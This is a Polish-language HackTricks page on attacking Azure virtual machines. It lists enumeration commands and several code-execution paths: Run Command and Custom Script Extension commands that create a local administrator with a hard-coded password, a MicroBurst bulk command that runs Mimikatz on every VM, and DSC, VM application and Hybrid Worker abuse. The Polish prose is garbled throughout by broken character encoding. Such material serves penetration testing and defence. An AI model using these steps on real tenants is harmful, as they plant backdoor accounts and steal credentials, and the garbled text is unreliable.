# Az - Maszyny Wirtualne i Sie

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Maszyny wirtualne Azure s jednym z kilku typ贸w [zasob贸w obliczeniowych na 偶danie i skalowalnych](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree), kt贸re oferuje Azure. Zazwyczaj wybierasz maszyn wirtualn, gdy potrzebujesz wikszej kontroli nad rodowiskiem obliczeniowym ni偶 oferuj inne opcje. Ten artyku dostarcza informacji o tym, co powiniene wzi pod uwag przed utworzeniem maszyny wirtualnej, jak j utworzy i jak ni zarzdza.

## Informacje o sieci Azure

Sieci Azure zawieraj **r贸偶ne podmioty i sposoby ich konfiguracji.** Mo偶esz znale藕 kr贸tkie **opisy,** **przykady** i **komendy enumeracji** r贸偶nych podmiot贸w sieciowych Azure w:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** oferuje bezpieczne, w peni zarzdzane rozwizanie dostpu RDP (Remote Desktop Protocol) i SSH (Secure Shell) przez SSL za porednictwem portalu Azure. Jest zintegrowany w ramach sieci wirtualnej Azure, co umo偶liwia czno RDP i SSH z VM-ami przy u偶yciu prywatnych adres贸w IP, unikajc potrzeby u偶ywania publicznych adres贸w IP. To czyni go bezpieczniejsz, bardziej wygodn alternatyw dla tradycyjnych metod zwizanych z przypisywaniem publicznych adres贸w IP i konfiguracjami regu NSG dla dostpu do VM. Programici i personel IT mog bezpiecznie uzyskiwa dostp do VM-贸w z portalu Azure za pomoc swoich przegldarek internetowych, co upraszcza proces dla rodowisk deweloperskich i testowych.

Aby wywietli wszystkie hosty Azure Bastion w swojej subskrypcji, mo偶esz u偶y nastpujcej komendy:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Enumeracja VM
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Uruchom polecenia w VM**

### **Logowanie AAD w VM**

Mo偶liwe jest zezwolenie na dostp dla u偶ytkownik贸w uwierzytelnionych za pomoc AzureAD. Na przykad pr贸bujc uzyska dostp do **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (wa偶ne jest, aby **u偶y adresu e-mail** z azurecorp u偶ywanego podczas pr贸by logowania) mo偶esz otrzyma bd taki jak: 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Po prostu **postpuj zgodnie z tymi instrukcjami**, przechodzc do [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i podajc kod, u偶yj adresu e-mail i hasa jako powiadcze, a bdziesz m贸g poczy si za pomoc SSH (jeli ten u偶ytkownik ma wystarczajce uprawnienia: rola `Virtual Machine Administrator Login` lub `Virtual Machine User Login`).

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Uruchomienie rozszerzenia niestandardowego skryptu**

Rozszerzenia maszyn wirtualnych (VM) w Azure to **mae aplikacje**, kt贸re zapewniaj konfiguracj po wdro偶eniu i automatyzacj **zada** na **maszynach wirtualnych Azure**. Na przykad, jeli maszyna wirtualna wymaga instalacji oprogramowania, ochrony antywirusowej lub mo偶liwoci uruchomienia skryptu wewntrz niej, mo偶esz u偶y rozszerzenia VM.

Dlatego, jeli masz dostp do zapisu, mo偶esz wykona dowolny kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) to narzdzie PowerShell podobne do Ansible, u偶ywane do konfigurowania hosta za pomoc kodu. DSC integruje si z Azure, umo偶liwiajc przesyanie konkretnych plik贸w konfiguracyjnych. Pliki te musz przestrzega cisej skadni. Co wa偶ne, rozszerzenie DSC w Azure mo偶e wykonywa polecenia z plik贸w, kt贸re speniaj okrelone kryteria formatowania, nawet jeli skadnia nie jest poprawna wedug standard贸w DSC, jak pokazano na dostarczonym rysunku.

Wykonanie tych polece jest uatwione przez funkcj [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) w Az PowerShell. Wymagania obejmuj plik **.PS1** z zdefiniowan funkcj, a plik musi by spakowany do pliku **.zip**. Mimo 偶e skadnia mo偶e nie by dokadna dla DSC, kod nadal zostanie wykonany. Jednak rozszerzenie oznaczy status wykonania jako "niepowodzenie", a 偶aden wynik z polecenia nie bdzie widoczny z powodu nadpisania statusu komunikatem o bdzie.

### VM Application Definitions

Definicje aplikacji VM umo偶liwiaj powtarzalne wdra偶anie wersjonowanych aplikacji na maszynie wirtualnej Azure. Ten zas贸b wspiera wdra偶anie i aktualizacj aplikacji w r贸偶nych maszynach wirtualnych. Aby to skonfigurowa, wymagane s r贸偶ne kroki, obejmujce polecenia takie jak **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** w Az PowerShell.

Wykonanie aplikacji lub polece t metod wi偶e si z **"VMAppExtension"**, kt贸ra jest automatycznie instalowana, gdy aplikacja jest stosowana do maszyny wirtualnej. Rozszerzenie pobiera plik z okrelonego URI i nazywa go dokadnie tak samo jak aplikacja, bez rozszerzenia. Aby poprawnie wykona plik, pole "ManageActions" w wywoaniu REST API musi by skonfigurowane do zmiany nazwy pliku na odpowiednie rozszerzenie. Ustawienie tej metody, po zakoczeniu, bdzie przypomina struktur pokazan na dostarczonym rysunku.

Jednak ta metoda wykonania jest stosunkowo wolna, zajmujc okoo 3-4 minut na wykonanie aplikacji lub polecenia. Pliki zwizane z tym procesem s przechowywane w okrelonych katalogach (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` dla kopii aplikacji i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` dla statusu wykonania).

Obie techniki oferuj unikalne sposoby wykonywania polece i wdra偶ania aplikacji w rodowiskach Azure, ka偶da z wasnym zestawem wymaga, krok贸w i rozwa偶a.

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) to funkcja w Azure, kt贸ra pozwala na wykonywanie Runbook贸w, skonfigurowanych w koncie automatyzacji, na maszynie wirtualnej Azure (VM), kt贸ra jest czci wyznaczonej HWG. To wykonanie jest uatwione przez rozszerzenie zainstalowane na VM, kt贸re wdra偶a kod Runbooka na VM. Istotnym aspektem tego procesu jest to, 偶e rzeczywiste powiadczenia nie maj znaczenia w wykonaniu, poniewa偶 kod dziaa z podwy偶szonymi uprawnieniami, konkretnie jako **SYSTEM** lub root, jak pokazano na dostarczonym rysunku.

Kluczowym szczeg贸em dla os贸b korzystajcych z maszyn wirtualnych Windows 10 jest konieczno okrelenia wersji PowerShell dla Runbooka. Powinna by ustawiona na uruchamianie jako PowerShell Wersja 5.1 zamiast 7.1. Wym贸g ten wynika z faktu, 偶e PowerShell 7.1 nie jest domylnie zainstalowany na tych maszynach wirtualnych, co prowadzi do niepowodzenia w wykonaniu skryptu, jeli okrelona jest wersja 7.1.

Ta funkcja Azure oferuje solidn metod automatyzacji i zarzdzania zadaniami w rodowiskach hybrydowych, umo偶liwiajc centralne zarzdzanie i wykonywanie zada na maszynach wirtualnych Azure.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
